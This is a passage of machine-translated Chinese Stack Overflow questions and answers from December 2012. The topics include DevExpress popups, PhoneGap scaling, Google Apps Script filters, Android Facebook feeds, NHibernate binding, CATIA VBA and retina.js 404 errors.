现在，如果有人有想法，请！谢谢

编辑 ！

有可能是

```
InputStream input = connection.getInputStream(); 
```

也失败了……我不知道为什么

# asp.net-mvc - 使用javascript而不是jquery获取点击的元素ID

> ID：13704240
> 
> 赞同：1
> 
> 时间：2012-12-04T13:39:07.343
> 
> 标签：asp.net-mvc, popup, devexpress

我在弹出窗口中有 2 个按钮。单击每个按钮时，弹出窗口执行回调。我的问题是当弹出窗口进行回调时我想知道单击了哪个按钮并导致回调我写了这段代码但它不起作用，因为在 BeginCallback 属性中 S.name 是弹出窗口的名称也 e.buttonID 为 null 因为 Html.DevExpress ().Button 不呈现按钮类型的输入，它呈现 td 和 div 标签请帮助我。

```
@Html.DevExpress().PopupControl(
        settings =>
         {
          settings.Name = "GetDatepopUp";
          settings.PopupElementID = "GetDate";
          settings.PopupAction = PopupAction.LeftMouseClick;
          settings.CloseAction = CloseAction.CloseButton;

          settings.Modal = true;
          settings.ShowOnPageLoad = false;
          settings.LoadContentViaCallback = LoadContentViaCallback.OnPageLoad; 
          settings.SetContent(() =>
               {
           @Html.RenderPartial("CalenderContainerPartialView", "Message");
                });
 settings.CallbackRouteValues = 
             new { Controller = "Message", Action = "Calender" };
 settings.ClientSideEvents.BeginCallback = 
            "function(s,e) { e.customArgs['btnName'] = s.name; }";

 settings.SetFooterTemplateContent(c =>
         {
           ViewContext.Writer.Write("<Table style='width:100%'><tr><td>");
           Html.DevExpress().Button(buttonsettings =>
                  {
                    buttonsettings.Name = "btnNext";
                    buttonsettings.Text = "<<";
                    buttonsettings.ClientSideEvents.Click = 
                        "function(s, e) { GetDatepopUp.PerformCallback(); }";
                  }).Render();
           ViewContext.Writer.Write("</td><td>");
           Html.DevExpress().Button(buttonsettings =>
                   {
                     buttonsettings.Name = "btnPrevious";
                     buttonsettings.Text = ">>";
                     buttonsettings.ClientSideEvents.Click = 
                          "function(s, e) { GetDatepopUp.PerformCallback(); }";
                  }).Render();
           ViewContext.Writer.Write("</td></tr></table>");
          });

  }).GetHtml() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-05T21:24:13.110

尝试改变：

```
GetDatepopUp.PerformCallback(); 
```

对此：

```
GetDatepopUp.PerformCallback('btnPrevious'); 
```

# android - Android phonegap 应用程序缩放太大

> ID：13704241
> 
> 赞同：0
> 
> 时间：2012-12-04T13:39:08.640
> 
> 标签：android, cordova

我将我的 Android 手机间隙应用程序设计为宽度：480 像素高度：320 像素的尺寸，并且该应用程序上设置了缩放以适应分辨率为 7 英寸平板电脑的屏幕尺寸`1280 x 1024`。

我尝试了多种使用缩放的方法：110% 左右让应用程序缩放以适应屏幕，但是当我在实际环境中运行应用程序时，它看起来比屏幕大得多。我是否错过了什么我需要元代码来更好地模拟我的缩放，就像它在 Web 浏览器中的工作方式一样？

在我的脑海里，我有

```
<meta name = "viewport" content = "initial-scale = 1.0">
<meta name="viewport" content="width=480,height=320"> 
```

提供的任何帮助都会很棒。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:32:12.967

我认为你应该阅读这篇[文章](http://developer.android.com/reference/android/webkit/WebView.html) 基本上你应该考虑屏幕密度而不是设备的实际宽度或高度，而不是尝试用缩放来补偿。检查“构建网页以支持不同的屏幕密度”部分

# html - 使用 video.js 的 HTML5 视频在完全下载之前不会播放

> ID：13704244
> 
> 赞同：2
> 
> 时间：2012-12-04T13:39:17.143
> 
> 标签：html, video, internet-explorer-9, autoplay, loaded

我对 html5 视频有一个奇怪的问题。它在除 Internet Explorer 之外的所有浏览器中都能正常工作。Internet Explorer 9 始终等待视频完全下载，直到开始播放。如果我在 Firefox、Chrome 甚至 Opera 中打开视频，一切正常。

代码片段如下所示

```
<video id="video-js-10734" class="video-js vjs-default-skin" width="640" height="480" controls="controls" autoplay="enabled" data-setup="{}" poster="1"><source src="http://www.lorch.biz/fileadmin/DAM_Lorch/Bilddaten/800-Doku/web/Videos/I-Torch_Movie_Full_HD_libtheora.ogv" type="video/ogg" /> <source src="http://www.lorch.biz/fileadmin/DAM_Lorch/Bilddaten/800-Doku/web/Videos/I-Torch_Movie_Full_HD_x264.mp4" type="video/mp4" /> </video> 
```

我是否忘记了一些关键字配置，或者这是 Internet 中的“功能”&*°ç&*ç！探险家？

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:54:40.813

可能是 IE 不支持 type="video/ogg" 的渐进式下载。仅适用于 H264 和 WebM。但是，您指定 mp4 文件。尝试使用 type="video/ogg" 和 .ogg 文件作为最后一个选项，并将 type="video/mp4" 和 .mp4 文件作为第一个选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:56:12.377

听起来 IE 不像其他浏览器使用相同的文件。我不记得 IE 是否支持 OGV 文件，但如果不支持，IE 应该使用您提供的 mp4 文件。看来您的 mp4 没有为自动启动设置延迟。

我有时会使用一个名为 MP4box 的程序来复用或解复用文件，这样它就可以在不加载所有内容的情况下启动。

# google-apps-script - 谷歌脚本过滤器问题

> ID：13704249
> 
> 赞同：0
> 
> 时间：2012-12-04T13:39:27.360
> 
> 标签：google-apps-script, google-sheets, google-apps, google-spreadsheet-api

我正在使用谷歌脚本、表格和电子表格编写一个帮助台系统。为了过滤查询，根据类别将提交的内容放入不同的工作表中，这是通过 FILTER 函数完成的。但是每次新提交时，过滤功能不会更新，（它使用 CONTINUE 功能覆盖其他单元格）而是必须选择具有 FILTER 功能的单元格，并且必须输入 crtl+shift+E

有没有解决的办法？我尝试了两种方法，第一种是希望有一个输入快捷方式的功能，但这可能吗？

第二个是每次进行新提交时自动进入继续功能，我有这个工作但是谷歌表格无法识别命名范围，（继续功能设置了CONTINUE（原始单元格，行距，列距）它的它无法识别的原始单元格，而是我必须手动选择单元格并重新编写完全相同的单元格引用。

感谢您的帮助，如果您需要查看我的代码，请询问:)

这是第二个选项的代码，我尝试手动将函数输入到单元格中。

```
var ss = SpreadsheetApp.getActiveSpreadsheet();
var numEntry = ss.getSheetByName('Home').getRange("B8").getValue() + 2;
var cat = ss.getSheetByName('Software problem').getRange(numEntry, 4, 1, 9);
cat.getCell(1, 1).setValue('=CONTINUE(D2, '+(numEntry-1)+', 1)'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T04:58:17.573

您的选项 1：让脚本自动输入击键？在应用程序脚本中不受支持。

您的选项 2：不必以编程方式插入 CONTINUE，因为当过滤器范围内的行与表达的条件匹配时，过滤器所需的 CONTINUE 应该是自动的。还有其他问题，所以不要被这个红鲱鱼赶上。

您提到“谷歌表格无法识别命名范围”-我想知道您的意思，因为我怀疑这就是您的解决方案。您可以在 FILTER 语句中使用命名范围。您还可以使用开放式范围，例如`FormInput!A1:X`或`FormInput!E1:E.`

如果您尝试使用脚本操作命名范围，那么您可能遇到了一个已知问题，“ [removeNamedRange() 仅删除通过 Apps 脚本创建的命名范围](http://code.google.com/p/google-apps-script-issues/issues/detail?id=1041)”。（要解决这个问题，请手动删除命名范围，然后仅从脚本创建它。）

这是我用来为工作表上的所有数据创建命名范围的函数。您可以根据自己的情况进行调整。（我将它与 QUERY 函数而不是 FILTER 一起使用，您可能需要考虑将其作为替代方案。）

```
function setNamedRangeFromSheet(sheetName) {
  // Cannot remove a named range that was added via UI - http://code.google.com/p/google-apps-script-issues/issues/detail?id=1041
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  try { ss.removeNamedRange(sheetName) } catch (error) {};
  var sheet = ss.getSheetByName(sheetName);
  var range = sheet.getDataRange();
  ss.setNamedRange(sheetName,range);
} 
```

使用 FILTER，您需要匹配 sourceArray 的长度（可以是命名范围）和您使用的任何标准数组。要以编程方式为 sourceArray 中的单列条件创建一个命名范围，并且长度相同，请在 sourceArray 范围上使用 getNumRows()。

现在，在表单提交时触发的提交处理函数中，您将拥有类似的内容。（我假设您的故障报告会出现在一张表格中，“FormInput” - 根据需要进行调整。）

```
...
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  try { ss.removeNamedRange("FormInput") } catch (error) {};
  var sheet = ss.getSheetByName("FormInput");
  var inputRange = sheet.getDataRange();
  ss.setNamedRange("FormInput",inputRange);

  try { ss.removeNamedRange("Criteria") } catch (error) {};
  var criteriaCol = 4; // Another guess, that Column E contains our criteria
  var criteriaRange = sheet.getRange(0,criteriaCol,inputRange.getNumRows(),1);
  ss.setNamedRange("Criteria",criteriaRange);
... 
```

有了这些，“软件问题”表上 A1 的内容只需要包含以下内容。（假设您正在寻找“错误”。）：

```
=FILTER(FormInput,Criteria="Bug") 
```

我之前提到了开放式范围。如果您没有对数据进行足够的操作来证明命名范围的合理性，您可以像这样设置您的过滤器，而不必在新输入进入时更改它：

```
=FILTER(FormInput!A1:X,FormInput!E1:E="Bug") 
```

# math - 排列组合计算并列出它们

> ID：13704258
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:39:46.863
> 
> 标签：math, language-agnostic, permutation, combinations, pseudocode

嗨，对伪代码了解不多，所以我想问一下如何做我想做的事情。我想打印数字 0、1、2、3、4、5、6、7、8、9 的所有可能组合的列表。我需要一个打印 8 位数字组合的代码，但我总是想要69 在这些组合之前。我不想知道有多少组合，我希望代码打印它们的列表。

IE。6900000000 6900000001 6900000002 。. . 6999999999 但另一个不在它旁边。我需要它们在列表中。我真的希望你能帮忙。提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:42:51.573

最简单的解决方案是打印 range 中的所有数字`[0,10^8)`，然后添加 69 作为前缀。（确保不要忘记前导零）

伪代码应该是：

```
for (integer i = 0; i < 10^8; i++) {
   print 69
   print i (with leading zeros)
   print EOL (End of Line)
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:43:12.597

尝试这样的事情：

```
for i = 1 to i = XXXX {
  print(69 + $i);
} 
```

# android - 使用 facebook api 从页面读取随机状态

> ID：13704259
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:39:49.687
> 
> 标签：android, facebook, facebook-graph-api

我正在为我的 facebook 页面创建一个 android 应用程序。该应用程序应该显示来自 facebook 页面的随机状态（不仅仅是最近的状态）。无论如何我可以做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:14:23.440

我从来没有做过这样的事情，但我认为你可以从中得出一些逻辑并让它发挥作用。

**第1步：**

调用 Facebook API，获取所有状态更新，然后`for`循环将它们添加到`ArrayList<String>`. 例如，Facebook 以 JSON 格式返回其数据。我假设，您已经知道如何获取数据。您需要从 Facebook API 调用返回的 JSON 数据中解析“消息”标签。

例如：

```
ArrayList<String> arrStatusMessage;

for (int i = 0; i < JAFeeds.length(); i++)  {
    JSONObject JOFeeds = JAFeeds.getJSONObject(i);

    if (JOFeeds.has("message")) {
        String strStatusMessage = JOFeeds.getString("message");
        arrStatusMessage.add(strStatusMessage );
    }
} 
```

**第2步：**

拥有整套 Facebook 状态消息后，您现在需要使用一个`java.util.Random`实例。

例如：（*请注意：*我没有测试过这段代码，它可能会导致错误。你可能需要尝试一下才能让它工作。:-()

```
private static final Random randomGenerator = new Random();

int intRandom = randomGenerator.nextInt(arrStatusMessage.size());
String strRandomStatus = arrStatusMessage.get(intRandom); 
```

**第 3 步：**

使用 将`strRandomStatus`其设置在`TextView`.

例如：

```
TextView txtRanStatus = (TextView) findViewById(R.id.txtRanStatus);
txtRanStatus.setText(strRandomStatus); 
```

您还没有发布任何代码，因此很难提供适合您的计划的东西。但我认为这应该让你开始。您可能需要调整一些东西并将它们放入您自己的代码中。

希望这可以帮助。

*编辑：根据 th OP 的评论，添加一些代码来获取 Facebook 状态消息：*

在你的`onCreate()`方法中：

启动一个新的*AsyncTask*：

```
new getFacebookFeeds().execute(); 
```

我在我的应用程序中使用此方法进行 Facebook 调用以从 Graph API获取所有**提要。**

```
private class getFacebookFeeds extends AsyncTask<Void, Void, Void>  {
    @Override
    protected Void doInBackground(Void... params) {
        String URL = "https://graph.facebook.com/me/home&access_token=ACCESS_TOKEN?limit=10";
        try {
            HttpClient hc = new DefaultHttpClient();
            HttpGet get = new HttpGet(URL);
            HttpResponse rp = hc.execute(get);

            if (rp.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                String result = EntityUtils.toString(rp.getEntity());

                // GET THE INTIAL RESULTS JSON ROOT
                JSONObject JORoot = new JSONObject(result);

                // GET THE "DATA" TAG FOR FEEDS ROOT
                JSONArray JAFeeds = JORoot.getJSONArray("data");

                for (int i = 0; i < JAFeeds.length(); i++) {
                    JSONObject JOFeeds = JAFeeds.getJSONObject(i);

                    if (JOFeeds.has("message")) {
                        String strStatusMessage = JOFeeds.getString("message");
                        arrStatusMessage.add(strStatusMessage );
                    }
                }
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

} 
```

您可以执行其余代码，在其中选择随机状态更新，`onPostExecute()`如上`AsyncTask`所示：

```
@Override
protected void onPostExecute(Void result) {
    int intRandom = randomGenerator.nextInt(arrStatusMessage.size());
    String strRandomStatus = arrStatusMessage.get(intRandom);

    txtRanStatus.setText(strRandomStatus);

} 
```

将 声明`TextView`为*全局变量*并`onCreate()`在调用`AsyncTask`. 我认为这应该工作得很好。让我知道事情的后续。:-)

# html - 不能像在 TEXTAREA 中那样在 DIV 中设置行距？

> ID：13704264
> 
> 赞同：0
> 
> 时间：2012-12-04T13:39:57.173
> 
> 标签：html, css

我发现我们可以通过设置 contenteditable='true' 和 overflow='auto' （或 'scroll'）将 DIV 用作 TEXTAREA（我不关心外观，只关心功能），但我真的可以'用谷歌搜索找不到解决方案，使它真的像一个 TEXTAREA，问题与行间距有关，当按下回车键时，下一行与 DIV 中的前一行距离太远。在使用 DreamWeaver 进行设计时，如果我尝试编辑 DIV 的内容并按 Enter 键并切换到代码窗口，我可以看到自动插入了 P 标签。这就是为什么 DIV 中的线条彼此相距太远，并且看起来不像在 TEXTAREA 中那样好。我想说它是如此丑陋和尴尬。

您能否让我知道如何在按下 Enter 键时抑制将 P 标签自动插入 DIV 内容的讨厌的行为？或者你能给我任何其他的解决方案来使 DIV 中的行像 TEXTAREA 一样正常吗？

非常感谢你！您的帮助将不胜感激！（我只是 Web 编程的新手，所以请耐心等待！！！Thanksss！！:)）

更新！！！你们可能都误解了我，当我说我按 Enter 键时，它不是在 DreamWeaver 之类的代码编辑器中，而是当我在浏览器中加载页面并尝试以普通用户身份输入时。那是我测试页面的时候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:42:02.793

像这样的东西？

```
#myDiv p{
    margin: 0px;
} 
```

我不能 100% 确定边距是导致行高问题的原因，您可能想尝试更改`height`,`padding`等，直到弄明白为止。

我尝试制作小提琴，但没有遇到同样的问题，行距对我来说看起来很正常：http: [//jsfiddle.net/dFzjT/](http://jsfiddle.net/dFzjT/) 仔细检查后，Chrome`div`在每个换行符上添加了额外的 s。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:42:45.603

切换到在代码视图而不是所见即所得 HTML 编辑器中进行编辑。然后你需要在开始和结束 div 标签之间输入：

```
<div>your text here.</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:07:49.803

事情就是这样。

这里的很多答案都回答了这个问题，但他们都错过了重要的一点。在某些时候，我们都是新手。

因此，让我给你一些建议，我希望我在开始这条道路时能得到这些建议。

*   学会阅读*代码*，你的生活会更轻松。

    现在看起来可能令人生畏，但请相信自己的学习能力，并努力奋斗几天。你会带着头痛和微笑从另一端出来。

*   在浏览器中编写代码、保存并刷新页面。

    这样，您可以在浏览器中查看它。您还应该拥有所有重要的浏览器：[Chrome](http://chrome.google.com)、[Firefox](http://getfirefox.com)、[Internet Explorer](http://ie.microsoft.com/)、[Opera](http://www.opera.com/download/)和[Safari](http://www.apple.com/safari/)。

*   学习使用像 MAMP / XAMPP / Visual Studio 这样的*本地主机服务器。*

    这样你就可以编写服务器端代码；这样您就可以测试、检查和调整 - 所有这些都无需上传任何内容。

最重要的是，虽然..

*   **远离所见即所得。**

    他们都只是坏消息。

    *只需编写自己的代码。*

:{D

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:32:18.967

我发现这个奇怪的问题（这可能会让你们中的一些人认为我是菜鸟？，否决我？）不是我的错，而是我使用的浏览器的错，它是 Opera 浏览器。我不认为它会以这种方式呈现 DIV 的内容。

尝试使用其他浏览器（如 Google Chrome、FireFox）后，它现在很正常，就像我想要的 TEXTAREA 一样。

谢谢！

# objective-c - 除 XCode 外，用于 Objective-C 和 iOS 开发的 IDE

> ID：13704279
> 
> 赞同：1
> 
> 时间：2012-12-04T13:40:25.210
> 
> 标签：objective-c, xcode, ide

是否有专门支持 Objective-C 并与 Cocoa Touch（可选 Cocoa）构建工具链接的 IDE，以便于编写、构建和运行程序？

我希望从 XCode 切换，因为当我加载包含数千行代码的文件时，XCode 有问题并且崩溃。美容仪也不好。它不是那么高效。

它不需要与 Interface Builder 一起提供。我只需要在 IDE 中编写 Objective-C。如果您是 Web 开发人员，则更像是 Aptana。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:48:02.750

Jetbrains 有 AppCode [http://www.jetbrains.com/objc/](http://www.jetbrains.com/objc/)。它是基于 IntelliJ 的 Xcode 替代方案，但取决于为 IB 和 CoreData 安装的 Xcode。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:56:25.803

仅用于编写 Obj-C 代码，您可以使用任何文本编辑器。

您不能像 IB 那样绘制任何 UI，但您可以编写代码来构造任何 UI 元素。

但是我建议使用 BBEdit。

或者，如果您希望可以使用任何 C/C++/Java IDE。但它不会编译编译你需要切换回 XCode。

或者您可以通过终端通过以下命令进行编译。

```
xcodebuild -project "delta.xcodeproj" -target "delta" -configuration Release OBJROOT="/Users/anoop/desktop/delta" SYMROOT="/Users/anoop/desktop/delta" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:03:55.467

我感觉到你的痛苦，但即使你找到了 XCode 以外的 IDE，你也会发现自己回到 XCode 做一些事情，比如 Interface Builder 等。另外，不幸的是，AppCode 也不完美。它尚未涵盖的某些情况可能会阻碍您迁移或导致您进行大量黑客攻击以使其正常工作。

但是，我有一个包含数百个文件（包括源文件）的项目，它对我来说效果很好。我承认它有时会崩溃，但你无能为力。也许尝试重构您的项目以减少源文件的大小。我确实发现拥有大型文本文件会导致它变得疯狂。但无论如何，拥有小的类文件是一个好习惯。也许您所描述的是臃肿类的代码味道？

我无意冒犯你或任何事情。这只是你看的另一个角度。使用它或不使用它。

# macos - 是否可以在 Mac OSX 10.5.8 (Leopard) 上构建 MonoDevelop 3？

> ID：13704283
> 
> 赞同：2
> 
> 时间：2012-12-04T13:40:34.977
> 
> 标签：macos, dependencies, monodevelop, upgrade

前段时间我下载了 MonoDevelop 3 for Mac，却发现它不能在 10.5.8 (Leopard) 版本上运行。后来我在一些不起眼的网站上找到了一个简洁的声明（我现在找不到了）。我在 MonoDevelop 网站上找不到任何关于 Mac 上 MD 版本 3.XX 的最低系统要求的信息。

那么是否有可能构建 MD 3 以在我的 Mac Leopard 机器上运行，还是我不得不升级到 Snow Leopard？或者，是否存在需要最低版本的 Xcode（在 4.xx 系列中？）来构建它的依赖项？

如果有人甚至可以向我指出一些关于我需要为我的 Mac 构建它的信息，那就太好了。

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T20:12:07.820

在 OS X 上构建 MonoDevelop 的说明在[这里](http://monodevelop.com/Developers/Mac_Support/Building_MonoDevelop_on_OS_X)。我多年来没有在 10.5 上构建它，但想不出它不应该工作的任何主要原因。它对来自 Xcode 的一些 Unix 工具（make、autoconf 等）具有构建时间依赖性，但较旧的 Xcode 应该可以正常工作，或者您可以在 Homebrew 上获得它们。主要依赖项是 Mono，以及 Mono 中包含的 GTK+，我不确定它们的依赖项是什么——试试最新的包。可能在 MD 本身的一些地方，我们对较新的事物（例如 P/Invokes）进行了次要依赖，您可以在遇到它们时修复它们。

# java - 内核 oops 中的 Java PID 是否属于线程？

> ID：13704286
> 
> 赞同：1
> 
> 时间：2012-12-04T13:40:52.417
> 
> 标签：java, multithreading, process, linux-kernel

如果我收到以下内核 oops

`kernel: CPU: 1`
`kernel: EIP: 0060:[<f956cb90>] Tainted: G X VLI`
`kernel: EFLAGS: 00010202 (2.6.13-15-smp)`
`kernel: EIP is at usb_lock_device+0x10/0x20 [usbcore]`
`kernel: eax: f9588dc4 ebx: 20303330 ecx: 00000023 edx: 20303330`
`kernel: esi: ffffffed edi: 080b6b70 ebp: f95769a0 esp: e7969f2c`
`kernel: ds: 007b es: 007b ss: 0068`
`kernel: Process java (pid: 11135, threadinfo=e7968000 task=f53c2020)`
`kernel: Stack: f95769de 0000001a 00000000 0000002b 00000000 00000023 080b6b70 f774ab40`
`kernel: 00000000 00000001 0000002b 0000002b 00000000 0000001a 00000000 00000001`
`kernel: ecd3c60c 00000001 e942d7c0 00000023 080b6b70 f95769a0 c0170fbc e7969fa4`
`kernel: Call Trace:`
`kernel: [<f95769de>] usbdev_read+0x3e/0x290 [usbcore]`
`kernel: [<f95769a0>] usbdev_read+0x0/0x290 [usbcore]`
`kernel: [<c0170fbc>] vfs_read+0xac/0x190`
`kernel: [<c0171391>] sys_read+0x41/0x70`
`kernel: [<c01042ab>] sysenter_past_esp+0x54/0x79`
`kernel: Code: c0 14 e9 f4 d6 d1 c6 8d 74 26 00 c3 eb 0d 90 90 90 90 90 90 90 90 90 90 90 90 90 89 c2 b8 c4 8d 58 f9 f0 ff 00 0f 88 b6 04 00 00 <f0> ff 4a 24 0f 88 ba 04 00 00 c3 90 8d 74 26 00 53 b9 c4 8d 58`

oops 中列出的 Java PID 可以是线程的吗？还是必须是 Java 进程？

PS：在内核 2.6.13-15-smp 上使用 JDK 1.6

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T11:47:46.913

我能够弄清楚这确实是一个线程ID。我使用了 top -H 并观察了 Java 实例以及正在运行的线程，并且能够看到导致此问题的 PID；它是负责轮询 USB 设备的线程。

感谢所有的帮助。

# c# - C# NHibernate QueryOver 选择多个属性

> ID：13704290
> 
> 赞同：1
> 
> 时间：2012-12-04T13:41:00.963
> 
> 标签：c#, nhibernate, datagridview

在我的 C# 应用程序中，我使用 NHibernate 从我的数据库表“房间”中获取所有房间。

```
using (ISession pSession = NHibernateHelper.OpenSession())
            {
                IList<Room> roomList = pSession.QueryOver<Room>().
                                                Where(x => x.FloorID == 3).
                                                .List();
            } 
```

表“房间”以及我的映射类（Room.cs）包含让我们说以下属性：

```
roomID
hash
date
identifier 
```

我有一个 DataGridView，它应该显示数据库中的表条目：代码是：

```
 roomDataGridView.DataSource = roomList; 
```

到目前为止效果很好。但现在我决定不想显示 Room 类的所有属性，我只想显示

```
roomID
identifier 
```

我尝试了以下方法：

```
roomDataGridView.DataSource = listOfRoomPropertiesForCurrentFloor.Select(x => new {x.Identifier, x.RoomID }); 
```

不幸的是，这不起作用...在我的 DataGridView 中没有打印任何内容。

问题：如何将房间表中的所有属性存储在我的房间模型中，但在 DataGridView 中只显示四个属性中的两个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:43:30.410

确保您的列名在 DataGridView 中定义并创建对象，基本上将 x.Identifier 分配给名称“Identifier”，以便可以拾取并调用该`ToList()`函数

```
roomDataGridView.DataSource = listOfRoomPropertiesForCurrentFloor
                              .Select(x => new {Identifier = x.Identifier, RoomID = x.RoomID }).ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:08:22.820

期望 DataGridView 属性`AutoCreateColumns`应设置为 true。已经有答案了：

*   [c#使用数据源隐藏datagridview中的属性](https://stackoverflow.com/a/1152975/1679310)
*   [是否有一个属性我可以在我的类中使用来告诉 DataGridView 在绑定到列表时不要为其创建列](https://stackoverflow.com/a/1066949/1679310)

提炼：

> 用属性标记不应该显示的属性`[Browsable(false)]`

# javascript - 通过 Javascript 创建动态 :hover 伪类

> ID：13704314
> 
> 赞同：0
> 
> 时间：2012-12-04T13:42:16.143
> 
> 标签：javascript, html, css, pseudo-class

看了[这个问题](https://stackoverflow.com/questions/817155/how-can-i-add-a-hover-class-to-an-element)后，我想知道如何做相反的事情。

我已经有一个要创建的按钮的主类，对于每个按钮，我将通过`myButton.style.backgroundImage`. 但是我还需要在 :hover 上为我拥有的每个不同按钮设置单独的背景。

如何通过 Javascript 访问 :hover 伪类来添加特定背景？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:48:34.293

您可以添加伪类 CSS（例如通过在 JS 中编写文档），或者您可以使用 Javascript 事件来设置悬停时的背景图像（mouseenter/mouseleave）。伪类被自动调用，不幸的是，没有办法手动“激活”它甚至“访问”它以进行样式修改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:59:29.003

不要`myButton.style.backgroundImage`用来设置背景图片，而是为每个按钮添加一个单独的类，例如`firstButton.className += ' first-button'`

然后，您可以为 CSS 中的每个按钮设置两种状态的样式：

```
.first-button {
    background-image: url('first.png');
}  
.first-button:hover {
    background-image: url('first_hovered.png');
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-04T13:51:32.017

:hover 伪类是 CSS 的一个特性。

因此，您可以在样式表中添加。

```
.myButtonClass1:hover {background: red;}
.myButtonClass2:hover {background: blue;} 
```

或者，如果你真的想使用 javascript，假设你有可用的 jQuery，你可以使用

```
$(".myButtonClass1").hover(
  function () {
    $(this).css("background", "red");
  },
  function () {
    $(this).css("background", "none");
  }
);

$(".myButtonClass2").hover(
  function () {
    $(this).css("background", "blue");
  },
  function () {
    $(this).css("background", "none");
  }
); 
```

# vba - 如何将点坐标从 CATIA 产品导出到 Excel

> ID：13704315
> 
> 赞同：1
> 
> 时间：2012-12-04T13:42:20.343
> 
> 标签：vba, catia

我正在寻找的是一个用 excel 或 CATIA 编写的 VB 脚本，它可以将 CATProduct 中的点坐标导出到 excel 电子表格中。由于我要处理大量的点，该过程需要尽可能自动化。

最终，我只需要导出特定点并将这些点组合成 4 个点，以确定它们属于哪个部分。

我有一个允许导入点的 excel 脚本，但这仅从几何集中获取点，而我正在查看的产品中的点位于零件主体中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T20:40:01.967

我相信可以做到，我要做的是搜索并选择 CATProduct 中的所有点，然后获取每个选定点的父级直到 Part，然后获取坐标（当然，如果你有的话，你需要在 Excel 中编写所有内容那里的代码）。

我不知道你是否可以在这里上传你的excel vba，但应该不那么难。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-11T14:58:56.190

按照此处的链接写入可以导入到 excel 的 CSV 文件：http: [//www.coe.org/p/fo/et/thread=27438](http://www.coe.org/p/fo/et/thread=27438)

您需要将 excel VBA 参考文件添加到您的 Catia VBA 项目中。

关于您的积分信息：

只是为了向您展示如何深入到一个点，我使用了基本点的“*插入”>“对象分辨率*”，并包含了一些关于如何获取坐标以及循环位置的注释。有一点需要注意，一些方法被“标记为受限”，这需要在使用“GetCoordinates”子之前将点对象设置为变体的中间“hack”。

```
Sub GetPointData()
'---- Begin resolution script for object : Point.1

Dim partDocument1 As PartDocument
Set partDocument1 = CATIA.ActiveDocument

Dim part1 As Part
Set part1 = partDocument1.Part

Dim hybridBodies1 As HybridBodies
Set hybridBodies1 = part1.HybridBodies

Dim hybridBody1 As HybridBody
Set hybridBody1 = hybridBodies1.Item("Geometrical Set.1")

Dim hybridShapes1 As HybridShapes
Set hybridShapes1 = hybridBody1.HybridShapes

Dim hybridShapePointCoord1 As HybridShapePointCoord
Dim XYZ(2) As Variant
Dim var As Variant

'BEGIN LOOP THROUGH YOUR POINTS HERE
Set hybridShapePointCoord1 = hybridShapes1.Item("Point.1")
Set var = hybridShapePointCoord1
var.GetCoordinates XYZ
'WRITE XYZ TO CSV
'NEXT POINT
'END LOOP

'---- End resolution script
End Sub 
```

# javascript - 在retina.js 库中抑制404

> ID：13704317
> 
> 赞同：25
> 
> 时间：2012-12-04T13:42:22.403
> 
> 标签：javascript, http-status-code-404, retina.js

我们使用 js [libretina.js](https://github.com/imulus/retinajs/)将低质量图像与“视网膜”图像（大小乘以 2）交换。问题是，retina.js 会为每个找不到的“视网膜”图像抛出 404。

我们拥有一个网站，用户可以在其中上传他们自己的图片，这些图片很可能不是视网膜分辨率。

有没有办法防止js抛出404s？

如果你不知道库。这是抛出 404 的代码：

```
http = new XMLHttpRequest;
http.open('HEAD', this.at_2x_path);
http.onreadystatechange = function() {
    if (http.readyState != 4) {
        return callback(false);
    }

    if (http.status >= 200 && http.status <= 399) {
        if (config.check_mime_type) {
            var type = http.getResponseHeader('Content-Type');
            if (type == null || !type.match(/^image/i)) {
                return callback(false);
            }
        }

        RetinaImagePath.confirmed_paths.push(that.at_2x_path);
        return callback(true);
    } else {
        return callback(false);
    }
}
http.send(); 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-15T11:06:17.767

我看到有几个选项可以缓解这种情况。

### 增强和持久化retina.js 的HTTP 调用结果缓存

对于设置为换出“1x”版本的任何给定“2x”图像，retina.js 首先通过`XMLHttpRequest`请求验证图像的可用性。成功响应的路径被缓存在一个数组中并下载图像。

以下更改可能会提高效率：

*   `XMLHttpRequest`可以缓存失败的验证尝试：目前，仅当先前成功时才跳过“2x”路径验证尝试。因此，失败的尝试可能会再次发生。实际上，这并不重要，因为验证过程发生在页面最初加载时。但是，如果结果保持不变，跟踪失败将防止重复出现 404 错误。

